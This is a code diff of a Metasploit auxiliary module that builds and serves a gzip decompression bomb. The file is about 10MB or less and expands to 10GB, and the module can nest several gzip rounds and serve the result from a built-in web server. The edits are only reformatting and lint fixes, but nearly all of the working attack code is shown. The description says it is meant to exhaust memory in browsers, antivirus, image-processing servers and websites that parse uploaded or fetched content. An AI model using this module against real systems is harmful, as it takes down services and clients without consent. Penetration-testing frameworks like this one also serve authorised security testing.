@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,39 +13,39 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Gzip Memory Bomb Denial Of Service',
-      'Description'    => %q{
-        This module generates and hosts a 10MB single-round gzip file that decompresses to 10GB.
-        Many applications will not implement a length limit check and will eat up all memory and
-        eventually die. This can also be used to kill systems that download/parse content from
-        a user-provided URL (image-processing servers, AV, websites that accept zipped POST data, etc).
+                      'Name'           => 'Gzip Memory Bomb Denial Of Service',
+                      'Description'    => %q{
+                        This module generates and hosts a 10MB single-round gzip file that decompresses to 10GB.
+                        Many applications will not implement a length limit check and will eat up all memory and
+                        eventually die. This can also be used to kill systems that download/parse content from
+                        a user-provided URL (image-processing servers, AV, websites that accept zipped POST data, etc).
 
-        A FILEPATH datastore option can also be provided to save the .gz bomb locally.
+                        A FILEPATH datastore option can also be provided to save the .gz bomb locally.
 
-        Some clients (Firefox) will allow for multiple rounds of gzip. Most gzip utils will correctly
-        deflate multiple rounds of gzip on a file. Setting ROUNDS=3 and SIZE=10240 (default value)
-        will generate a 300 byte gzipped file that expands to 10GB.
-      },
-      'Author'         =>
-        [
-          'info[at]aerasec.de', # 2004 gzip bomb advisory
-          'joev'                # Metasploit module
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'URL', 'http://www.aerasec.de/security/advisories/decompression-bomb-vulnerability.html' ]
-        ],
-      'DisclosureDate' => 'Jan 1 2004',
-      'Actions'     =>
-        [
-          [ 'WebServer' ]
-        ],
-      'PassiveActions' =>
-        [
-          'WebServer'
-        ],
-      'DefaultAction'  => 'WebServer'))
+                        Some clients (Firefox) will allow for multiple rounds of gzip. Most gzip utils will correctly
+                        deflate multiple rounds of gzip on a file. Setting ROUNDS=3 and SIZE=10240 (default value)
+                        will generate a 300 byte gzipped file that expands to 10GB.
+                      },
+                      'Author'         =>
+                        [
+                          'info[at]aerasec.de', # 2004 gzip bomb advisory
+                          'joev'                # Metasploit module
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'URL', 'http://www.aerasec.de/security/advisories/decompression-bomb-vulnerability.html' ]
+                        ],
+                      'DisclosureDate' => 'Jan 1 2004',
+                      'Actions' =>
+                        [
+                          [ 'WebServer' ]
+                        ],
+                      'PassiveActions' =>
+                        [
+                          'WebServer'
+                        ],
+                      'DefaultAction'  => 'WebServer'))
 
     register_options(
       [
@@ -53,7 +54,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('URIPATH', [false, 'Path of URI on server to the gzip bomb (default is random)']),
         OptString.new('CONTENT_TYPE', [false, 'Content-Type header to serve in the response', 'text/html'])
       ],
-    self.class)
+      self.class
+    )
   end
 
   def run
@@ -63,14 +65,14 @@ class MetasploitModule < Msf::Auxiliary
     exploit # start http server
   end
 
-  def on_request_uri(cli, request)
+  def on_request_uri(cli, _request)
     print_status "Sending gzipped payload to client #{cli.peerhost}"
-    rounds = (['gzip']*datastore['ROUNDS']).join(', ')
-    send_response(cli, @gzip, { 'Content-Encoding' => rounds, 'Content-Type' => datastore['CONTENT_TYPE'] })
+    rounds = (['gzip'] * datastore['ROUNDS']).join(', ')
+    send_response(cli, @gzip, 'Content-Encoding' => rounds, 'Content-Type' => datastore['CONTENT_TYPE'])
   end
 
   # zlib ftw
-  def generate_gzip(size=default_size, blocks=nil, reps=nil)
+  def generate_gzip(size = default_size, blocks = nil, reps = nil)
     reps ||= datastore['ROUNDS']
     return blocks if reps < 1
 
@@ -81,14 +83,14 @@ class MetasploitModule < Msf::Auxiliary
       begin
         # add MB of data to the stream. this takes a little while, but doesn't kill memory.
         if blocks.nil?
-          chunklen = 1024*1024*8 # 8mb per chunk
-          a = "A"*chunklen
+          chunklen = 1024 * 1024 * 8 # 8mb per chunk
+          a = "A" * chunklen
           n = size / chunklen
 
           n.times do |i|
             stream << a
             if i % 100 == 0
-              print_status "#{i.to_s.rjust(Math.log(n,10).ceil)}/#{n} chunks added (#{'%.1f' % (i.to_f/n.to_f*100)}%)"
+              print_status "#{i.to_s.rjust(Math.log(n, 10).ceil)}/#{n} chunks added (#{'%.1f' % (i.to_f / n.to_f * 100)}%)"
             end
           end
         else
@@ -96,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         a = nil # gc a
-        buf = generate_gzip(size, io.string, reps-1)
+        buf = generate_gzip(size, io.string, reps - 1)
       ensure
         stream.flush
         stream.close
@@ -106,6 +108,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def default_size
-    datastore['SIZE']*1024*1024 # mb -> bytes
+    datastore['SIZE'] * 1024 * 1024 # mb -> bytes
   end
 end
